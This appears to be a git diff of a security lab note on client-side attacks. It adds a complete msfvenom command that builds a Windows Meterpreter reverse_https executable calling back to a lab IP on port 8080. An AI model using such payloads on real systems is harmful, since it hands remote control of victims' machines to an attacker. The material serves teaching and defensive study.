@@ -1,4 +1,4 @@
-# client-side-protection
+# Client Side Protection  
 
 ## Objective
 
@@ -31,10 +31,10 @@ msfvenom --list payloads
 msfvenom --payload windows/meterpreter/reverse_https --list-options
 ```
 
-- We can change te basic options, LHOST is our computer and LPORT is the port we want to listen on.
+- We can change te basic options, LHOST is our computer and LPORT is the port we want to listen on. We can change the values and choose a file format and name for the payload we want to create.
   
 ```bash
-msfvenom --payload windows/meterpreter/reverse_https LHOST=<our IP> LPORT=8080
+msfvenom --payload windows/meterpreter/reverse_https LHOST=192.168.233.134 LPORT=8080 --format exe --out reverse_https_8080.exe
 ```
 
 - 
